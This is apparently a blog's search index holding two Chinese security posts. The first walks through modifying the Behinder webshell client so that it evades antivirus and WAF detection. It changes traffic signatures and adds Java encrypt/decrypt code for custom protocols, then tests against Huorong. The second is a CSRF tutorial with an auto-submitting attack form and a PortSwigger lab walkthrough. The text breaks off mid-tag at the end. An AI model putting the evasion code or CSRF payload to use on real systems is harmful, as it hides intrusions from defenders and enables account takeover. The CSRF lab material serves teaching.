<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BehinderV4魔改</title>
    <link href="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/"/>
    <url>/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="Behinder介绍"><a href="#Behinder介绍" class="headerlink" title="Behinder介绍"></a>Behinder介绍</h2><p>“冰蝎”(Behinder)是一个动态二进制加密网站管理客户端，相比较于传统的老牌工具“菜刀”而言，对webshell的流量进行了相应的加密。”冰蝎”客户端基于JAVA，所以可以跨平台使用，随着版本的升级，兼容性也随之提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大，是现如今必不可少的渗透测试工具之一</p><h2 id="时光荏苒"><a href="#时光荏苒" class="headerlink" title="时光荏苒"></a>时光荏苒</h2><p>攻防技术一直都在不断发展的，随着防守技术日趋成熟和完善，攻击手段也就需要不断地更新、创新。而”冰蝎”早已不再更新。因此现已被各大厂商的检测系统及WAF对其特征进行了记载与分析，所以这也是为什么在实战中经常碰到“落地成盒”的原因，马子刚传上去就die了, 就更别说拿shell了。因此我们需要在原版的基础上进行改造从而适应当今全新的攻防世界</p><h2 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h2><p>可以通过更改流量特征以及添加自己的加密协议，从而达到免杀的效果，因为强特征很容易被杀毒软件识别，当我们修改了特征它就无法判断是否为恶意流量，更改协议也是一个道理，杀毒软件病毒库里面已经存放了冰蝎中内置的6个加密协议，所以需要我们自定义协议来绕过查杀，而冰蝎v4开放了传输协议的自定义功能，使得流量魔改更为简单方便</p><p>首先将冰蝎的jar包进行反编译拿到源码</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_23-37.png" class="" title="2024-02-08_23-37.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>拿到源码之后，新建一个目录把源码和冰蝎4（单放在一个目录里面）放在同一目录</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_22-29.png" class="" title="2024-02-08_22-29.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_22-29_1.png" class="" title="2024-02-08_22-29_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>打开ide，在刚才的目录中创建一个新项目，并将冰蝎的jar包导入模块中，并设置好主类，这里的主类一定不要弄错：net.rebeyond.behinder.ui<br>（注：jdk版本1.8，并且还要把原文件中的数据库文件复制到主文件中，否则过会运行会报错）</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_14-09.png" class="" title="2024-02-09_14-09.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>在修改之前，我们先看一下behinder数据包原先的样子</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_14-16.png" class="" title="2024-02-09_14-16.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>其中Accept、Accept-Language特征最为明显，并且UA头是内置的且随机，所以考虑先把一些强特征进行修改，要注意的是：所有的修改不能直接在文件中改需要把整个路径复制到src文件中，把不需要修改的文件可以删掉，不然构建的时候会很慢</p><p>我们通过accept特征进行全局搜索，找到了net下的constants文件，而数据包中ua特征和其他特征都在shell文件中，因此就先对这两个文件进行魔改</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_09-19.png" class="" title="2024-02-08_09-19.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-20.png" class="" title="2024-02-08_20-20.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-38.png" class="" title="2024-02-08_20-38.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-39.png" class="" title="2024-02-08_20-39.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>并且冰蝎中有个固定的Content-type字段：Content-type: application&#x2F;x-www-form-urlencoded</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-52.png" class="" title="2024-02-08_20-52.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>同样这个特征也可以改，因为这里只有php和aspx的，我们可以添加上jsp和asp</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-55.png" class="" title="2024-02-08_20-55.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>全部改完之后，构建工程和模块重新运行一下看看结果</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-41.png" class="" title="2024-02-08_20-41.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-15.png" class="" title="2024-02-08_20-15.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_20-42.png" class="" title="2024-02-08_20-42.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>可以发现基本的强特征都已经被修改，数据包中的ua头和其他关键特征也已经被修改。接下来对数据协议进行自定义加密，绕过主流杀软和waf等安全设备的检测，冰蝎4内置了六种传输协议，但早已被记载</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_21-49.png" class="" title="2024-02-08_21-49.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>这里分享两种加密，第一种是key-value格式+unicode加密，以jsp脚本类型为例<br>加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Encrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id=1&amp;content=DaYer0&amp;token=1452178369&amp;status=00000&quot;</span>;<br> <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span><br>java.util.Base64.getEncoder().encodeToString(data).replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>).replace(<span class="hljs-string">&quot;/&quot;</span>,<br><span class="hljs-string">&quot;&gt;&quot;</span>);<br> <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br> <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; result.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> result.charAt(i);<br>   unicode.append(<span class="hljs-string">&quot;\\u00&quot;</span> + Integer.toHexString(c));<br> &#125;<br> content = content.replace(<span class="hljs-string">&quot;DaYer0&quot;</span>, unicode.toString());<br><br> <span class="hljs-comment">// ROT13 encryption</span><br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">encryptedContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; content.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> content.charAt(i);<br>   <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;a&#x27;</span>);<br>   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;A&#x27;</span>);<br>   &#125;<br>   encryptedContent.append(c);<br> &#125;<br> <span class="hljs-keyword">return</span> encryptedContent.toString().getBytes();<br>&#125;<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] Decrypt(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception &#123;<br> <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data);<br> <span class="hljs-comment">// Reverse ROT13 decryption</span><br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedContent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; content.length(); i++) &#123;<br>   <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> content.charAt(i);<br>   <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;a&#x27;</span>);<br>   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123;<br>     c = (<span class="hljs-type">char</span>) (((c - <span class="hljs-string">&#x27;A&#x27;</span>) + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">&#x27;A&#x27;</span>);<br>   &#125;<br>   decryptedContent.append(c);<br> &#125;<br><br> <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> decryptedContent.toString();<br> java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br> bos.write(decodedString.getBytes(), <span class="hljs-number">13</span>, decodedString.length() - <span class="hljs-number">43</span>);<br> <span class="hljs-type">String</span> <span class="hljs-variable">unicode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bos.toByteArray());<br> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br> <span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br> <span class="hljs-keyword">while</span> ((i = unicode.indexOf(<span class="hljs-string">&quot;\\u&quot;</span>, pos)) != -<span class="hljs-number">1</span>) &#123;<br>   sb.append(unicode.substring(pos, i));<br>   <span class="hljs-keyword">if</span> (i + <span class="hljs-number">5</span> &lt; unicode.length()) &#123;<br>     pos = i + <span class="hljs-number">6</span>;<br>     sb.append((<span class="hljs-type">char</span>) Integer.parseInt(unicode.substring(i + <span class="hljs-number">2</span>, i + <span class="hljs-number">6</span>),<br><span class="hljs-number">16</span>));<br>   &#125;<br> &#125;<br> <span class="hljs-type">byte</span>[] decryptedData =<br>java.util.Base64.getDecoder().decode(sb.toString().replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;/&quot;</span>));<br> <span class="hljs-keyword">return</span> decryptedData;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后可以使用冰蝎的传输协议进行测试，如果提示“保存成功”就说明解密加密一致</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-08_21-22.png" class="" title="2024-02-08_21-22.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>修改完后同样的我们要把文件放在src目录下，确保文件和之前所在目录一致，我们生成服务端测试一下效果</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-13.png" class="" title="2024-02-09_15-13.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>可以看到流量包中的数据已经被加密。第二种是multipart格式+hex加密<br>加密</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] <span class="hljs-title function_">Encrypt</span>(<span class="hljs-type">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-built_in">String</span> upload=<span class="hljs-string">&quot;-----------------------------7e6103b1815de Content-Disposition:form-data;name=\&quot;uploadFile\&quot;;filename=\&quot;test.png\&quot; Content-Type:application/octet-stream  DaYer0 -----------------------------7e6103b1815de--&quot;</span>;<br>    <span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">String</span> result = java.<span class="hljs-property">util</span>.<span class="hljs-property">Base64</span>.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(data).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>).<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&gt;&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;result.<span class="hljs-property">length</span>();i++)&#123;<br>        <span class="hljs-type">int</span> ch = (<span class="hljs-type">int</span>)result.<span class="hljs-property">charAt</span>(i);<br>        <span class="hljs-built_in">String</span> s4 = Integer.<span class="hljs-property">toHexString</span>(ch);<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span> + s4;<br>    &#125;<br>    upload=upload.<span class="hljs-property">replace</span>(<span class="hljs-string">&quot;DaYer0&quot;</span>,<span class="hljs-built_in">str</span>);<br>    <span class="hljs-keyword">return</span> upload.<span class="hljs-property">getBytes</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] Decrypt(<span class="hljs-keyword">byte</span>[] data) <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    java.io.ByteArrayOutputStream bos=<span class="hljs-keyword">new</span> java.io.ByteArrayOutputStream();<br>    bos.<span class="hljs-keyword">write</span>(data,<span class="hljs-number">150</span>,data.length-<span class="hljs-number">195</span>);<br>        String s= <span class="hljs-keyword">new</span> String(bos.toByteArray());<br>        <span class="hljs-keyword">byte</span>[] baKeyword = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[s.length()/<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; baKeyword.length; i++)&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            baKeyword[i] = (<span class="hljs-keyword">byte</span>)(<span class="hljs-number">0</span>xff &amp; Integer.parseInt(s.substring(i*<span class="hljs-number">2</span>, i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>),<span class="hljs-number">16</span>));<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span>&#123;<br>        s = <span class="hljs-keyword">new</span> String(baKeyword, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e1)&#123;<br>        e1.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> java.util.Base64.getDecoder().decode(s.replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-22.png" class="" title="2024-02-09_15-22.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>测试一下效果</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-27.png" class="" title="2024-02-09_15-27.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>最后做一下免杀测试，因为我的win虚拟机上就装了一个火绒，就先做火绒的测试吧，其他自测就好</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/688463846a03d520af12793620365b4.png" class="" title="688463846a03d520af12793620365b4.png">]]></content>
    
    
    <categories>
      
      <category>研究日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF总结</title>
    <link href="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/06/CSRF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="CSRF介绍"><a href="#CSRF介绍" class="headerlink" title="CSRF介绍"></a>CSRF介绍</h2><p>跨站请求伪造（Cross-site request forgery，简称CSRF），一种常见的web安全漏洞，攻击者利用受害者身份发起了HTTP请求，导致受害者在不知情的情况下进行了业务操作；它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰，并且由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行，简单来说就是你点击我构造的恶意链接，我就可以以你的名义去发起一个http请求。常见的漏洞利用场景：修改资料、提交订单、发布留言或评论等，并且在Web应用中，用户登录后执行的操作中有些处理一旦完成就无法撤销，比如用户使用信用卡支付、从用户的银行账号转账、发送邮件、更改密码或邮箱地址等都成为了CSRF的典型攻击案例</p><h2 id="CSRF主要的攻击形式"><a href="#CSRF主要的攻击形式" class="headerlink" title="CSRF主要的攻击形式"></a>CSRF主要的攻击形式</h2><p>① GET类型的CSRF</p><p>这类攻击非常简单，只需要构造一个HTTP请求，即可完成攻击</p><p>② POST类型的CSRF<br>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，访问问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上</p><p>③ 链接类型的 CSRF<br>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种类型需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：&lt;a href&#x3D;” taget&#x3D;”_blank”&gt; 由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问这个页面，则表示攻击成功</p><h2 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h2><h3 id="CSRF漏洞产生的原因"><a href="#CSRF漏洞产生的原因" class="headerlink" title="CSRF漏洞产生的原因"></a>CSRF漏洞产生的原因</h3><p>(1)http协议使用session在服务端保存用户的个人信息,客户端浏览器用cookie标识用户身份;</p><p>(2)cookie的认证只能确保是某个用户发送的请求,但是不能保证这个请求是否是”用户自愿的行为”.</p><p>(3)这时,用户登录了某个web站点,同时点击了包含CSRF恶意代码的URL,就会触发CSRF</p><h3 id="漏洞利用的条件"><a href="#漏洞利用的条件" class="headerlink" title="漏洞利用的条件"></a>漏洞利用的条件</h3><p>(1)用户必须登录A网站,生成了cookie</p><p>(2)登录的同时访问了恶意URL(包含CSRF恶意代码的URL).</p><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><p>为了方便理解，可以看一下我下面做的这个流程图</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/ae23ebf70d53939f7ed0052a3576698.png" class="" title="ae23ebf70d53939f7ed0052a3576698.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>例如，假设应用程序包含一个允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作时，他们会发出如下一个 HTTP 请求：</p><p>POST &#x2F;email&#x2F;change HTTP&#x2F;1.1<br>Host: vulnerable-website.com<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session&#x3D;yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p><p>email&#x3D;<a href="mailto:&#x77;&#105;&#x65;&#110;&#x65;&#114;&#64;&#x6e;&#x6f;&#114;&#109;&#x61;&#108;&#x2d;&#x75;&#x73;&#x65;&#x72;&#46;&#x63;&#x6f;&#109;">&#x77;&#105;&#x65;&#110;&#x65;&#114;&#64;&#x6e;&#x6f;&#114;&#109;&#x61;&#108;&#x2d;&#x75;&#x73;&#x65;&#x72;&#46;&#x63;&#x6f;&#109;</a></p><p>这满足了CSRF所需的条件：<br>1、攻击者通常能够触发密码重置并完全控制用户的帐户<br>2、应用程序使用会话 cookie 来识别发出请求的用户<br>3、攻击者可以轻松执行、修改操作所需的请求参数的值</p><p>具备这些条件后，攻击者就可以构建包含以下 HTML 的网页：</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果受害者用户访问攻击者的网页，将会发生以下情况：</p><p>攻击者的页面将触发对易受攻击的网站的 HTTP 请求。<br>如果用户登录到易受攻击的网站，他们的浏览器将自动在请求中包含其会话 cookie<br>并且该网站将以正常方式处理该请求，视为由受害用户正常发出，却成功的更改了电子邮件地址<br>SUCCCESS！</p><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/247866.html">https://www.freebuf.com/articles/web/247866.html</a><br><a href="https://developer.aliyun.com/article/1207187">https://developer.aliyun.com/article/1207187</a><br><a href="https://www.cnblogs.com/jingdongkeji/p/17799878.html">https://www.cnblogs.com/jingdongkeji/p/17799878.html</a></p><h2 id="CSRF漏洞常见利用方式"><a href="#CSRF漏洞常见利用方式" class="headerlink" title="CSRF漏洞常见利用方式"></a>CSRF漏洞常见利用方式</h2><p>下面我将用burpsuite官方靶场环境来做演示</p><h3 id="无防御措施的CSRF漏洞"><a href="#无防御措施的CSRF漏洞" class="headerlink" title="无防御措施的CSRF漏洞"></a>无防御措施的CSRF漏洞</h3><p>首先使用提供的账号密码登录实验室 wiener:peter</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-22.png" class="" title="2024-02-05_20-22.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>可以看到此时默认邮箱是 <a href="mailto:&#x77;&#x69;&#x65;&#x6e;&#101;&#x72;&#64;&#x6e;&#111;&#x72;&#x6d;&#97;&#108;&#45;&#117;&#115;&#x65;&#x72;&#46;&#110;&#x65;&#x74;">&#x77;&#x69;&#x65;&#x6e;&#101;&#x72;&#64;&#x6e;&#111;&#x72;&#x6d;&#97;&#108;&#45;&#117;&#115;&#x65;&#x72;&#46;&#110;&#x65;&#x74;</a> ，我们先随便模拟修改邮箱账号修改一个并抓个包</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-25.png" class="" title="2024-02-05_20-25.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>我们可以看到，数据包中只提交了一个修改后的邮箱数据，这里我们可以直接使用 burp 自带的功能来生成 POC，把邮箱修改成我们想要的攻击效果，也就是只需要修改 value 中的值就可以了</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-26_1.png" class="" title="2024-02-05_20-26_1.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>然后将生成的攻击链接 copy 一下，然后在同一个浏览器打开，来模拟受害者点击我们传播的 url 即可，此时可以看到邮箱修改成功，则表示攻击成功</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-28.png" class="" title="2024-02-05_20-28.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-32.png" class="" title="2024-02-05_20-32.png"><h3 id="有防护的CSRF漏洞（常见绕过）"><a href="#有防护的CSRF漏洞（常见绕过）" class="headerlink" title="有防护的CSRF漏洞（常见绕过）"></a>有防护的CSRF漏洞（常见绕过）</h3><h4 id="未限制请求方法"><a href="#未限制请求方法" class="headerlink" title="未限制请求方法"></a>未限制请求方法</h4><p>还是刚才修改邮箱场景的靶场环境，首先我们先抓包看看数据包，分析一下修改邮箱怎么实现的</p><img 